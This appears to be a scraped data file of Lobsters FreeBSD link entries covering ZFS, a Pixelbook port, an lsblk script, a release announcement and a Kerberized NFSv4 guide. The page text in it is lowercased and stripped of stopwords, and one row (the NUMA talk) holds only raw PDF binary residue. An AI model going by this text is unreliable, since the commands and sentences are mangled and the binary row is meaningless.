casablanca think beginning beautiful friendship
210,Lobsters,freebsd,FreeBSD,By the numbers: ZFS Performance Results from Six Operating Systems and Their Derivatives,https://www.youtube.com/watch?v=HrUvjocWopI,number zfs performance result six operating system derivative,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature number zfs performance result six operating system derivative youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature number zfs performance result six operating system derivative youtube
211,Lobsters,freebsd,FreeBSD,Transitioning from FreeNAS to FreeBSD,https://www.youtube.com/watch?v=VQtU6pv6rHI,transitioning freenas freebsd,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature transitioning freenas freebsd youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature transitioning freenas freebsd youtube
212,Lobsters,freebsd,FreeBSD,In-Kernel TLS Framing and Encryption for FreeBSD,https://www.youtube.com/watch?v=la-ljVavd3c,inkernel tl framing encryption freebsd,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature inkernel tl framing encryption freebsd youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature inkernel tl framing encryption freebsd youtube
213,Lobsters,freebsd,FreeBSD,20 Years of FreeBSD Jails,https://www.youtube.com/watch?v=S3u8OtjfGFE,year freebsd jail,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature year freebsd jail youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature year freebsd jail youtube
214,Lobsters,freebsd,FreeBSD,FreeBSD and custom firmware on the Google Pixelbook,https://unrelenting.technology/articles/FreeBSD-and-custom-firmware-on-the-Google-Pixelbook,freebsd custom firmware google pixelbook,back awful qualcomm laptop samsung chromebook pinebook pro mxm slot ifixit score one pixelbook rubber palm rest chromebook even intel boot guard google security chip buy solder case closed debugging special flashrom way bricking device reproducible build mentioned something freebsd title mrchromebox full rom image wayfire wifi bluetooth input device keyboard patch touch nice driver development well corresponding patch configuring device via acpi upcoming intel improvement patch debugging upd pixelbook pen thankfully expose generic hid stylus report write driver display backlight brightness adding thing linuxkpi patch sent linux add prefer dpcd toggle suspendresume fancy new thing tpm experienced thinkpad userspace tool stack wrote driver wip could used ssh key hanging couple minute resume dynamic cpu frequency intel speed shift tablet mode switch connect montior sortof computerinakeyboard look replicate onscreen keyboard keyboard backlight brightness fun easy driver write using debug cable freebsd simple usb serial driver took debugging comment audio firmware fun need run keyboard nvme quick patch upd must run rw firmware patch aside mess firmware practical conclusion,back jumped thinkpad bandwagon getting run freebsd unlike people thinkpad crowd actually liked clickpad use trackpoint much summer decided time something newer wanted something lighter thinner ha turn actually important got tired carrying h c c laptop apple right along display lenovo making serious laptop first place awful size especially hidpi display ideally good size exact scaling instead fractional usbc port without dgpu especially without nvidia gpu assembled screw glue necessarily need expansion stuff laptop much able replace battery without dealing glued chassis good supported freebsd course development required okay going write big driver something open source firmware would fun qualcomm laptop embedded gpu driver like freedreno ufs storage driver qualcomm wifi ported freebsd qualcomm firmware cursed samsung chromebook new pinebook pro would awesome linux user embedded gpu driver freebsd one added stuff needed fdtofw attachment linuxkpi rather tedious work support pcie right someone please make arm laptop pcie gpu say mxm slot still gon na really liked design microsoft surface book ifixit score one especially marvell wifi chip driver freebsd dealbreakers considering thinkpad carbon old generation one year corebootable fun going back processor generation feel great want something efficient le discovered pixelbook big huge large bezel around screen liked everything thin aluminum design hidpi screen rubber palm rest every laptop ever convertibleness flip screen around turn something rather big tablet useful actually wacom touchscreen support pen mostly reasonable hardware intel wifi famous coreboot support chromebooks stock firmware coreboot depthcharge new laptop google pixelbook chromebook even write protect screw kind meme year later thing everyone various developer forum associate chromebooks time moved reaction glued device stuff chrome firmware team discovered new innovative way asserting physical presence sitting around minute pressing power button asked actually pretty clever though secure wait let go back beginning look firmware security chromebooks laptop device designed mass market first average consumer trust vendor read lot scary news might afraid scary attacker install stealthy rootkit right firmware business even afraid push boot security company laptop even intel boot guard thing vast majority laptop day thing make sure vendor update firmware evil rootkits unfortunately user also google like laptop vendor yes google kind surveillance capitalism advertising monster talking large part google much driven fo enthusiast something anyway point chromebooks based fo firmware support user control much possible without compromising regularuser security turn conflicting goal happy instead boot guard google way securing boot process root trust modern device special google security chip normal circumstance also ensures google firmware run machine sit aforementioned powerbuttonclicking procedure get developer mode o verification warning screen boot press ctrld boot chrome o enabled via command run root ctrll open seabios fun part seabios flash coreboot payload rwlegacy slot right chrome o reboot press key booting payload also buy solder special cable suzyqable procedure couple time laptop turn ultimate open intel firmware development machine seriously security chip debug chip case closed debugging give serial console security chip embedded controller ec application processor ap ie main cpu also give flasher via special flashrom told plan upstream allows write ap ec firmware security still preserved debugging set ccd password let lockunlock debug capability change writeprotect whenever want flash firmware least without opening case invasive thing flash chip even soic anymore think hack without fear security chip brickable yes yes mean chip look touch kind open source boot googlesigned firmware especially paranoid people think nsa think awesome way allow full control main processor ec cable way bricking device solve paranoia reproducible build would great mentioned something freebsd title okay okay let go even want write introduction chromebooks anyway waiting debug cable arrive done lot work freebsd using first method rwlegacy seabios display output working os specifically support coreboot framebuffer openbsd freebsd really hate legacy bios install uefi implementation rwlegacy since cable yet build work see probably debug build failing assertion downloaded mrchromebox full rom image extracted payload using cbfstool flashed boom go press ctrll uefi nice let install freebsd live usb booted fine efi framebuffer nvme ssd keyboard working basic system resized chrome o data partition chrome o recovers fine without touching custom partition found already efi system partition setup boot chrome o boot like installed everything went configuration developing support hardware note leaving desktop configuration part mostly development post use wayfire display server curious hardware wifi bluetooth well easy pixelbook intel exact wireless chip thinkpad wifi work great iwm bluetooth newer would already worked intel device present normal ubt usb bluetooth adapter except becomes normal upload firmware otherwise kinda dead dead state spews interrupt raising idle power consumption preventing system going package state usbconfig poweroff stuff freebsd firmware uploader support older protocol used hard add one done yet input device keyboard google kept keyboard good old great ensuring get started custom o forsure working keyboard interesting thing keyboard google assistant key win key usually recognized anything used dtrace detect scancode without adding print kernel rebooting dtrace n fbt entry printf st x x n int fbt return printf xn wrote patch interpret useful key right meta think anything better touch touchpad touchscreen like many modern laptop know cursed bus gaining popularity least freebsd driver intel synopsys designware really controller meanwhile apple macbooks use spi even keyboard freebsd intel spi driver right support acpi attachment atom pcie yet even better news nice driver development well note corresponding patch configuring device via acpi pretty much requirement uncomment dhaveacpiiicbus iichid makefile get work also upcoming intel improvement patch touchscreen started working driver instantly touchpad lot fun bus would appear dead debugging turned inprogress iichid driver sending wrong extra outofspec command causing google touchpad firmware throw lock whole bus hey nice bug discovery device turn strict accepting input one else would problem another touchpad thing default touch lot pressure easily fixed libinput cat usrlocaletclibinputlocaloverridesquirks eve touchpad matchudevtypetouchpad upd pixelbook pen touchscreen pixelbook made wacom support stylus input like usual wacom tablet usb one freebsd use webcamd run linux driver userspace exactly thankfully expose generic hid stylus report zero wacom specific required able write driver quite easily work pressure tilt button thing display backlight brightness another fun debugging experience intelbacklight console utility still thing use freebsd nothing knew driver chrome o could adjust brightness made work took adding thing linuxkpi allow uncommenting brightness control naturally uncommenting finding panel us native displayport brightness configured via dpcd displayport configuration data enabling bootloaderconf finding fun bug hardware sort panel report support dpcd backlight direct pwm line true googlequantawhoever connect pwm line panel aware driver prefers pwm line reported available turn patch sent linux add prefer dpcd toggle reason merged patch apply cleanly simpler hack version inteldpauxdisplaycontrolcapable struct intelconnector connector panel support backlight control aux channel inteldp edpdpcd dpedptconbacklightadjustmentcap inteldp edpdpcd dpedpbacklightbrightnessauxsetcap inteldp edpdpcd dpedpbacklightbrightnesspwmpincap inteldp edpdpcd dpedpbacklightbrightnessauxsetcap pixelbook eve simpler version http inteldp edpdpcd dpedpbacklightbrightnesspwmpincap endif drmdebugkms aux backlight control supported n return true work step brightness adjustment even suspendresume pixelbook us regular old acpi sleep fancy new thing good every machine tpm though tell tpm save state suspending otherwise get reset resume already knew experienced thinkpad google security chip run opensource tpm implementation fun fact written microsoft connected drum roll big surprise freebsd already tpm support kernel userspace tool stack recently added port well course support connecting tpm especially gsc tpm specifically quirk wrote driver wip hooking transport relies aforementioned patch use interrupt found buggy first attachment fire continuously reattach stop completely attach system resume first command error fixed work resume fixed entropy harvested could used ssh key another thing resume build kernel nodevice sdhci prevent intel sdmmc controller attached anything heard model might using emmc instead nvme unclear hanging couple minute resume dynamic cpu frequency least stock firmware oldschool intel speedstep work driver could find required acpi node perf something forget new intel speed shift let cpu adjust frequency work nicely linked patch tablet mode switch lid flipped around keyboard disabled unless turn display brightness zero heard fun mean connect montior sortof computerinakeyboard look like retro computer system get notification chrome o reacts enabling tablet mode looking dsdt table acpi quite obvious support notification device tbmc name hid hid hardware id name uid one uid unique id name ddn tablet motion control ddn do device name method tbmc notserialized rctm one return one else return zero linux exposed evdev device switch event able replicate quite easily display server support anything yet like something like enabling onscreen keyboard pop automatically tablet mode active keyboard backlight brightness generally leave look keyboard fun easy driver write also obvious work looking acpi device kblt name hid hid hardware id name uid one uid unique id method kbqc notserialized return method kbcm notserialized using debug cable freebsd debug cable present serial console bulk endpoint without configuration capability linux supported simple usb serial driver adding device simple freebsd driver ugensatook debugging driver clearing usb stall port opened allowed usb spec quite necessary device unfortunately debug interface throw see request responsible code device something need add support comment audio thing unsupported onboard audio usual hda controller expose displayport audiothroughthemonitor thing speaker mic headphone jack connected various codecs exposed yet write driver codecs since really interested audio laptop firmware fun debug cable arrived spent time debugging consoleonfreebsd thing mentioned started messing coreboot tianocore discovery far nothing ap console stock firmware google compiles release fw serial output think save power something mecleanerneeds run w mf mentioned mf partition contains pcie related stuff removing cause nvme drive detach soon boot upstream coreboot including mrchromebox build fails initialize tpm get zero response vendor id request funnily enough would solved resume problem without write tpm driver freebsd written prefer actually ability use tpm recent uefipayloadpkg support keyboard nvme box easy add hopefully someone would add upstream seeing bug report uefipayloadpkg support getting framebuffer coreboot well coreboot run intel gop driver payload funny running uefi module running uefi implementation work well libgfxinit nice fo writteninada verifiedwithspark implementation intel gpu initialization framebuffer configuration support kaby lake however dpcd thing display panel report max lane bandwidth libgfxinit interprets slowest speed end enough bandwidth highres screen told new way conveying information unsupported dig around linux code try implement properly quick hack hardcoding faster bandwidth tada display initialized formally verified open source code minus one blob running boot persistent storage efi variable need smm magic quick patch change emulated variable store use coreboot smm store proper smm store like look making corebootcompatible least writing separate corebootcompatible store module upd external display displayport alt mode usbc used thing note dp dp cable literally becoming hdmi cable work usb type c hdmian connector gpu passive hdmimdp dongle plugged mdptypec dongle work chrome ec run alt mode negotiation o need special support dp dongle work ec must run rw firmware happen asis upstream coreboot jump command ec console also patch help aside mess firmware kind person made happy fact code boot process laptop open verified want thing work might excited open source firmware development cool thing firmware give practical benefit best example seeing better hackintosh support instead patching macos work machine could patch machine pretend almost mac cool conclusion pixelbook freebsd coreboot good seriously big word say recommending laptop fo enthusiast
215,Lobsters,freebsd,FreeBSD,List Block Devices on FreeBSD lsblk(8) Style,https://vermaden.wordpress.com/2019/09/27/list-block-devices-on-freebsd-lsblk8-style/,list block device freebsd lsblk style,command freebsd update added usagehelp information update code reorganization rewrite mount nozfs update added support update added support mount procfs proc proc p ax grep pgrep pgrep read cat proc icmdline echo done p p pgrep tr n sed command sed mountexfat l l gls l stat f hr dev dev stat f lr dev dev update another rewrite gpart show gpart show p git commit wc lsblksh wc lsblkshold like,work linux system usually miss many nice freebsd tool example name sockstat gstat top b re top io total usbconfig rcorder beadmbectl idpriortprio sometimes rarely happens linux useful tool available freebsd example tool lsblk one thing quite well list block device content problem like listing disk entirely used zfs pool lsblk display two partition instead information zfs know much circle cddl licensed zfs unloved gpl world example lsblk output linux system lsblk name maj min rm size ro type mountpoint rom sda disk part boot part vglocallvroot lvm vglocallvswap lvm swap vglocallvhome lvm home sdc disk part data sdd disk part data freebsd offer department camcontrol geom command available also use gpart command list partition find output command single disk laptop please note wordpress limitation need change character one command output camcontrol devlist samsung ssd evo msata target lun geom disk list geom name provider name mediasize sectorsize mode descr samsung ssd evo msata lunid ident rotationrate fwsectors fwheads gpart show gpt efi freebsdboot free freebsdzfs free provide needed information acceptable manner system small amount disk would like display summary system drive content lsblksh come handy lsblk many interesting feature like perm scsi inverse mode focused provide basic feature list system block device content long pleasing experience writing shell script sysutilsbeadm sysutilsautomount though writing lsblksh may good idea actually opensourced say shared projectidea thread lsblk command freebsd freebsd forum lack time really slowed side project development pace finally got back finish lsblksh generally small simple shell script tale le sloc example output lsblksh command single disk laptop lsblksh device maj min size type label mount gpt efi unmounted freebsdboot free freebsdzfs zfs free output graphical window find example lsblksh output server two system ssd drive two hdd data drive lsblksh device maj min size type label mount gpt efi unmounted freebsdboot free freebsdswap unmounted freebsdzfs zfs free bf gpt efi unmounted freebsdboot free freebsdswap unmounted freebsdzfs zfs free gpt freebsdzfs zfs free gpt freebsdzfs zfs free find example system tested lsblksh lsblksh fastest script earth needed parsing job quite well would like install system type command fetch usrlocalbinlsblk http rawgithubusercontentcomvermadenscriptsmasterlsblksh chmod x usrlocalbinlsblk hash r rehash lsblk got time original linux lsblk subcommandoptionargument worth adding lsblksh script regard update added usagehelp information added usage information displayed specifying one argument h h h help help help imho writing man page simple utility needle think create dedicated man page lsblksh tool grow size option comparable linux lsblk equivalent look lsblksh help usage basic usage information lsblksh disk example list block device system lsblksh device maj min size type label mount gpt efi unmounted freebsdboot free freebsdzfs zfs list block device lsblksh device maj min size type label mount mbr freebsd freebsdufs root freebsdswap swap swap hint display disk system sysctl kerndisks kerndisks regard update code reorganization rewrite least git try tell commit message git commit master rework entire flow split code function add many useful comment word version file changed insertion deletion rewrite lsblksh several productive hour new incarnation lsblksh available similar sloc smaller quarter better accuracy great example le wc scriptslsblkshold scriptslsblkshold wc scriptslsblksh scriptslsblksh thing simple solution described one double label fat filesystems label fat label named efisys choose something fat filesystems label chosen gpt label glabel status grep na msdosfsefisys na also able cover fuse mount mount example device ntfs exfat mountexfat visible difference mount output mount fusefs devfuse mntntfs fusefs devfuse mntexfat fusefs mount filesystem daemon like sysutilsautomount keep track device mounted directory varrunautomountstate file get detach event device know u n mount devfuse device possible maybe know way extracting information devfuse generally fuse device mounted little presentation update various non zfs filesystems mounted mount nozfs devfs dev devfs local multilabel linprocfs compatlinuxproc linprocfs local tmpfs compatlinuxdevshm tmpfs local devlabelasd mnttmp msdosfs local devfuse mntntfs fusefs mntufsother ufs local devgptother mntfatother msdosfs local mntufs ufs local lsblksh display lsblksh device maj min size type label mount gpt efi freebsdboot free freebsdzfs zfs free mbr freebsd freebsdufs root mntufs freebsdswap labelswap swap freebsdufs freebsdufs mntufsother ntfs msdosfsone msdosfs large gpt msbasicdata gptother mntfatother used file based memory device default lsblksh also display memory disk content mdconfigsh l vnode homevermadenfile vnode homevermadenfilegpt vnode homevermadenfiler look xterm terminal regard update added geli support thought adding geli support may useful latest lsblksh avoids code duplication mount label detection moved single unified function also added comment code readability minor fix smaller wc wc wc lsblksh lsblksh according git commit changed time insertion deletion git commit master add geli support avoid code duplication move mountlabel detection function comment minor fix file changed insertion deletion also forgot mention lsblksh thanks smart optimization like thing twice aggregating grep awk pipe single awk query run time faster initial version new output geli support regard update added fuse support wrote update keeping track mounted fuse hard mounted device magically become devfuse mount done little research found information really mounted using fuse interface freebsd available mounting procfs filesystem proc need cat cmdline entry pid perfect information least available mount procfs proc proc p ax grep mntntfs mntntfsanother mntntfsanother pgrep pgrep read cat proc icmdline echo done code prototype worked fuse mountpoints detection e fusemounts read pid cat proc pid cmdline echo done eof pgrep eof fusemounts echo fusemounts sort u fusemounts echo fusemounts sed fusechecks echo fusemounts grep dev target fusechecks mount echo fusechecks sed sdev target g fi fi fi realized found new better way getting information without mounting proc filesystem need display process command line argument example like p p pgrep tr n sed command sed mntntfs mntntfsanother mntntfsanother also thought ntfs process also added exfat support searching mountexfat pid well fuse mount point detection work ntfs exfat filesystems code support even shorter try fuse mount process mountfound fusepids pgrep mountexfat tr n sed fusemounts p p fusepids command sed sort u mount echo fusemounts grep dev target awk print fi also changed major minor number displayed hex dec linux freebsd l base system display hex example get value l l crwrw root operator gnu equivalent using gls freebsd port sysutilscoreutils package show major minor dec value gls l linux world l name already taken freebsd base system tool freebsd developersmaintainers add g letter gnu distinguish gls l crwrw root also easierfaster get stat tool maj stat f hr dev dev min stat f lr dev dev latest lsblksh look like yet added lsblksh freebsd port several new version important feature span across two day regard update another rewrite messing gpart found using p flag game changer difference p flag display name along partition longer needed find prefix create partition name default gpart output gpart show mbr freebsd ntfs output gpart p flag gpart show p mbr freebsd ntfs discovery implicated quite large rewrite lsblksh git commit estimate code rewrite git commit file changed insertion deletion rewrite lsblksh latest lsblksh feature previous bug fixed detects exfat label faster le sloc le code handle bsdlabel entire device properly handle exfat entire device properly difference code shown wc lsblksh lsblksh wc lsblkshold lsblkshold latest lsblksh look usual use instead unmounted one eof like like loading related
216,Lobsters,freebsd,FreeBSD,NUMA Siloing in the FreeBSD Network Stack,https://people.freebsd.org/~gallatin/talks/euro2019.pdf,numa siloing freebsd network stack,,obj endobj obj endobj obj endobj obj mediabox parent r resource r typepage endobj obj endobj obj stream endstream endobj obj font pattern procset pdftextimagebimagecimagei xobject endobj obj endobj obj endobj obj endobj obj cidtogidmapidentitydw r endobj obj endobj obj stream ka dc p x z kjߡc ƻ p endstream endobj obj stream g vɧ j endstream endobj obj endobj obj cidtogidmapidentitydw r endobj obj endobj obj stream j f v fu odhh n n rj l h g ңp ig hob l b ә e w e lgs n kp x p p pϕky p v b l ƣb endstream endobj obj stream endstream endobj obj endobj obj cidtogidmapidentitydw r endobj obj endobj obj stream h qf h p l b l ur ɢ f ťs en z f e ҫ g c ibk e zp dm ۃ g e dx g n
217,Lobsters,freebsd,FreeBSD,FreeBSD 12.1-BETA1 Now Available,https://lists.freebsd.org/pipermail/freebsd-stable/2019-September/091533.html,freebsd available,freebsd available gjb freebsdorg http http http http http wwwfreebsdfoundationorgdonate information freebsdstable mailing list,freebsd available glen barber gjb freebsdorg sat sep utc begin pgp signed message hash first beta build release cycle available installation image available generic generic powerpc generic powerpcspe generic rpib bananapi beaglebone cubieboard cuboxhummingboard pandaboard wandboard genericsd generic note regarding arm sd card image convenience without console access system freebsd user password freebsd available default ssh access additionally root user password set root strongly recommended change password user gaining access system installer image memory stick image available http image checksum follow end email notice problem report bugzilla pr system stable mailing list would like use svn source based update existing system use branch list change since available release note http please note release note page yet complete updated ongoing basis cycle progress virtual machine disk image vm disk image available architecture disk image may downloaded following url freebsd download mirror http partition layout kb freebsdboot gpt partition type bootfs gpt label gb freebsdswap gpt partition type swapfs gpt label gb freebsdufs gpt partition type rootfs gpt label disk image available vhd vmdk raw disk image format image download size approximately mb mb respectively decompressing gb sparse image note regarding virtual machine image modified qemu efi loader file needed able boot virtual machine image see page information http boot vm image run cpu virt bios qemuefifd serial telnet server nographic drive ifnone filevmdisk device virtioblkdevice device virtionetdevice netdev user sure replace vmdisk path virtual machine image amazon ami image amis available following region region region region region region region region region region region region region region region region region region amis available following region region region region region region region region region region region region region region region region region region vagrant image image available hashicorp atlas site installed running vagrant init vagrant upgrading freebsdupdate utility support binary upgrade system running earlier freebsd release system running earlier freebsd release upgrade follows freebsdupdate upgrade r process freebsdupdate may ask user help merging configuration file confirming automatically performed merging done correctly freebsdupdate install system must rebooted newly installed kernel continuing shutdown r rebooting freebsdupdate need run install new userland component freebsdupdate install recommended rebuild install application possible especially upgrading earlier freebsd release example freebsd alternatively user install compatibility library afterwards system must rebooted new userland shutdown r finally rebooting freebsdupdate need run remove stale file freebsdupdate install iso checksum generic generic powerpc generic powerpcspe generic rpib bananapi beaglebone cubieboard cuboxhummingboard pandaboard wandboard genericsd generic vm image checksum regard glen brought rubicon communication llc netgate love freebsd support future release donation freebsd foundation http wwwfreebsdfoundationorgdonate begin pgp signature end pgp signature information freebsdstable mailing list
218,Lobsters,freebsd,FreeBSD,Your Infrastructure Should be Boring (2016),https://people.freebsd.org/~dch/2016/your-infrastructure-should-be-boring/,infrastructure boring,infrastructure boring instead debugging random crap time change freebsd storage openzfs upgrade boot environment port package poudriere homebrew core functionality package infrastructure boring,infrastructure boring imagine every time picked phone make call completely redesigned reinvented button went turn stove instead button knob press something different maybe needed swipe like touch device give special hand gesture imagine different every day work tech know talking already sort stuff infuriating many tool use daily get job done interface working principle change repeatedly get job done instead spend time researching fixing underlying problem sometimes ok free time burn enjoy instead say testing craft beer skiing part get face get frustrated annoyed happens every day get angry maybe customer getting angry maybe family upset fixing computer thing get back work thing planning actually deliver thing promised somebody done read kid story go bike ride spend time partner instead debugging random crap large degree feel current state linux specifically serverside linux want infrastructure boring spend time energy developing improving innovating thing promised need rely able manage change consistently time place choosing whim mercy distribution really want spend free time tracking latest kernel pull additional functionality systemd promptly break stuff changed decade needing openssl update end cascading infinitely expanding vortex doom desperately want first softwaredefined black hole demonstrates requiring package system upgraded version tested application know application entire reason server exists reason user thing paid make choice uptodate security patch tracking reliable version tool use deliver manage business need reinstall system possible setup identical given point time development testing build match actually deployed yet seems last year become case managing infrastructure become job largely necessary sub task shipping great software service time change since using freebsd since mid become main computing platform work server workstation laptop comment could entire blog post drop brief list hope future get around fleshing storage openzfs one killer feature freebsd work art computing world zfs fully featured filesystem inbuilt checksum snapshot rollback interserver replication built superb performance characteristic data worth family photo company record storing zfs sir fool already experienced bitrot premature drive death zfs least know upgrade zfsbased boot environment provide point time fully bootable snapshot o making one instant allows switch back preceding o version simply separate zfs datasets holding application data file need replay transaction log bring restored copy date possible roll back o without touching application data abi compatibility contract kernel user library application freebsd preserve across minor version software built freebsd run without modification necessary rebuild application o binary bumped kernel userland developed together first really appreciate significance horrific experience debian apthell update get freebsd project get closer releasing next version whole kernel userland tested together people like application completely separate upgrade one without impact linux updating next debian release grab new kernel also pull random wedge dependency may may anything resolving security exposure presumably main reason update first place result application break feature roll forward comfortable ability roll o back needed also sure application impacted port package poudriere huge fan osx project called homebrew usercontributed repository install packaging script thousand open source tool project idea new come port tree available bsd derived operating system massive repository opensource software specifically set tweaked patched particular operating system entire setup based standard bsd makefiles nice homebrew rubybased dsl powerful addition developer adding missing package library take hour case port tree available subversion git repository carrying patch waiting go review commit pipeline straightforwards freebsd introduced new flexible binary package deployment system support custom package repos easily using publically available one let use prior version software needed use custom private package containing secret sauce poudriere build framework us port jail build requested package source clean room jail produce new binary package repository support option flag port tree producing custom package piece cake together mean holy trinity sysadmin software management repeatable build using port poudriere consistent deploys using binary package full source control custom change yes possible linux get complicated messy quickly find veritable peat bog complexity trying put together incomplete documentation blog post core functionality package clear dividing line core functionality party tool linux distribution think clustering failover technology partially dependent party component tested maintained together could tell happens kernel updated userland component may seem like arbitrary philosophical choice experience systemd influx shown important choose replace default syslog ntpd freebsd sure exactly interface need duplicate implement however depending exactly linux kernel distribution specific functionality may subsumed systemd surprisingly complicated example newer version systemd include dhcp server change permission hardware device allow creating user include new console driver may may considered distro release prepared even reverse functionality removed distro relies issue crop test production take time energy manage area software stack u spend little time track changed systemd version understand implication trying ship software portable across distros need manage intricacy sort variation across may find consoled come gone log management done differently functionality rely spawn daemon may exist one release another need upgrade kernel close security risk one main reason upgrade day avoid remote code exploit privilege escalation avoid change end trying manage fact causing chaos production endless delay testing basic functionality option sound le painful linux never clear separation kernel core userspace functionality daemon needed provide working operating system third party library uncoordinated chaos sad inevitable result distro distro across varying version kernel supplied tool basic functionality like logging service management network funtionality generates staggering amount unnecessary rework infrastructure boring comparison found freebsd resulting platform stable manageable minimal effort dependent leadingedge kernel feature available currently deployed fleet o chimaera partially tested combination party tool filesystems linux kernel next major release development easily move build pipeline alpha beta release candidate build test final release announced month testing upgrading reasonably safe knowing trusted rollback zfs boot environment away unlikely event something unexpected turn think freebsd platform building robust repeatable service core functionality built necessary simple make change build roll flexible operating environment running service kernel hodgepodge extra package seemed good choice rime maybe give try
219,Lobsters,freebsd,FreeBSD,Kerberized NFSv4 in a mixed-OS environment,https://amoradi.org/2018/12/30/kerberized-nfsv4.html,kerberized mixedos environment,kerberized mixed environment intro environment freebsd server kdc kerberos section freebsd handbook full dns record casesensitive kerberos server server nfs section freebsd handbook linux client ubuntu kerberos window client window pro anniversary update kerberos optional component thing left useful link credit kerberos ldap howto look dead authenticating window mit kerberos,kerberized mixed environment intro mixed home environment window linux freebsd well represented unfortunately documentation scarce kerberos come nonenterprise environment note come handy setting mixed environment kerberized setup big fan manpages refer relevant manpages best friend environment rest note used freebsd act kdc kerberos key distribution center kerberos server server along window pro anniversary update ubuntu lts client freebsd server kdc freebsd come heimdal kerberos base opted use setup quite straightforward first read kerberos section freebsd handbook kadmin kinit following section note thing found different guide mentioned order kerberos work use either full slim dns kerberos spec take full preference ignores dns record find full sample full found work follows libdefaults defaultrealm homelan domainrealm homelan homelan realm homelan kdc fbsdhomelan adminserver fbsdhomelan recommend enabling logging case anything go wrong logging kdc file varheimdalkdclog kdc syslog info default syslog info found running tail f varheimdalkdclog helpful tracking server talk kdc dns record either dns full unbound setup dns resolver local lan pfsense first kerberos need find realm find realm kerberos take fqdn host successively query domain chain find txt record example hostname mylonghostfqdncom following query order kerberosmylonghostfqdncom kerberoslonghostfqdncom kerberoshostfqdncom kerberosfqdncom soon find txt record stop us result realm following record unbound applies lan kerberoshomelan txt homelan pfsense add dns resolver custom option follows server localdata kerberoshomelan txt homelan next kerberos need find realm ie answer kdc passwd etc located query following srv record dns record caseinsensitive kerberos casesensitive make sure keep case proper dns record added following unboundconf kerberosudphomelan srv fbsdhomelan kerberostcphomelan srv fbsdhomelan kpasswdudphomelan srv fbsdhomelan kerberosadmtcphomelan srv fbsdhomelan lookup srv record format find number mean far kerberos concerned looking kerberos udp tcp myrealm myrealm capital feel free play around record see one needed setup ie tcp v udp etc using dns consider security tradeoff v use also make sure hostname fqdn host return full fqdn host including domain part case homelan test dns record using host host srv kerberostcphomelan final dns record pfsenseunbound server localdata kerberosudphomelan srv topolihomelan localdata kerberostcphomelan srv topolihomelan localdata kpasswdudphomelan srv topolihomelan localdata kerberosadmtcphomelan srv topolihomelan localdata kerberoshomelan txt homelan kerberos server kdc working well setup freebsd server server principal kadmin essentially need kerberos run kadmin l add whatever principal want add randomkey generates principal random password good hostnfsetc type principal use exported keytabs user need login add name work fine kadmin l add myprincipal extkeytab keytabpathtokeytab myprincipal guide describe generating principal detail add note key kerberos arbitrary name however agent expect certain name convention example server expects principal format nfsfqdndomain read client use hostfqdndomain attempt noticed nfsfqdndomain work look output gssd vvv verbose output see principal us run gssd vvv foreground watch output order server work need principal format exported keytab placed use extkeytab command see kadmin copy resulting keytab server first create principal server named nfsfqdndomain replace fqdndomain fqdn server case would kadmin l add randomkey nfsfbsdhomelan extkeytab nfsfbsdhomelan extkeytab without keytab export convenience see man kadmin see export nfs section freebsd handbook relevant manpages nfsd nfsuserd mountd gssd etcrcconf enable nfs server see respective rc script nfsserverenable yes nfsserverflags u n h ip address server yes managegids see nfsuserd nfsuserdenable yes nfsservermanagegids yes mountdenable yes mountdflags r h ip address server rpcbindenable yes gssd bridge make kerberization possible see gssd run separately foregound vvv help debug issue make sure kerberos side nfs working gssdenable yes gssdflags h optional program might misbehave file locking enabled rpclockdenable yes rpcstatdenable yes forget line enable reason leave sys also make sure restart reload mountd whenever change etcexports sys mydocuments sys use showmount make sure exported also use sysctl explore option modify look vfsnfsd sysctl particular vfsnfsdserverminnfsvers need restrict nfs minimum version linux client ubuntu ubuntu number convenience thing cost clarity found thing ubuntu clear translate distros kerberos feel free use either mit heimdal kerberos opted heimdal become familiar install heimdalclients copy freebsd server decided dns see dns section need kinit principal test everything work created user principal bare username every user expect access server see kinit kdestroy klist use like kinit principal klist kdestroy one quirk note testing multiple principal keep kiniting different principal make sure umount nfs mount kinit remount order permission take effect want login kerberos login install libpamheimdall run pamauthupdate enable kerberos login pam see etcpamdcommon file see pamauthupdate changed config enable kerberos essentially added bunch line install nfscommon make sure gssd run editing etcdefaultnfscommon like needgssdyes needidmapdyes systemctl start nfsclienttarget make sure rpcgssdservice nfsidmapdservice running sure idmapd nfsidmapdservice necessary see mountnfs nfs etcfstab look like clienthomelan pathtonfsmount pathtolocaldirectory ac fg user one quirk found set export try connect ubuntu fail still try negotiate set sys cover corner case nfsstat check result negotiation use nfsstat see nfsstat see option negatiated server client see setup able browse file appropriate permission get file error make sure logged kerberos kinit window client window pro anniversary update kerberos first create hostwindowshostnamefqdndomain principal kdc custom password randomkey password used later window pro know edition come kerberos client way use ksetupexe see ksetupexe help following setup get working ksetupexe need administrator powershell able run ksetupexe cmdexe time local user window machine name principal kdc call myuser ksetup setrealm homelan ksetup addkdc homelan fbsdhomelan ksetup setmachpassword password used hostwindowshostnamehomelan principal ksetup setrealmflags homelan sendaddress delegate ksetup mapuser myuser homelan myuser test connection following command runas netonly user myuser homelan cmdexe see cmdexe pop kerberos user logout log back user myuser homelan make sure put username domain open cmdexe run klist get output like klist current logonid cached ticket number client myuser homelan server krbtgthomelan homelan kerbticket start time end time renew time session key cache flag kdc called successfully logged kerberos use ksetupexe without argument see current set option think used setmachpassword setcomputerpassword know one trick make mistake mapuser go hkeylocalmachinesystemcurrentcontrolsetcontrollsakerberos edit anniversary update window pro enables service nfs enable nfs support going control panel program option add feature something along line client nfs able mount nfs drive cmdexe following command mount nolock fbsdhomelan myexporteddir z mount share z make sure nonprivileged cmdexe prompt show explorerexe find enablelinkedconnections registry key thanks dkeav freebsd freenodenet need mount administrator show user optional component use ldap sync uidgids found necessary make work well thing left find way network explorerexe mount custom option nolock seems needed work regardless serverside lockd sufficed batch script run mount command multiple directory happy remember definitive comprehensive guide configuration might work arrived configuration home network let know find error omission useful link credit info taken verbatim convenience kerberos ldap howto look dead authenticating window mit kerberos thanks freebsd freenodenet help find fengshaun
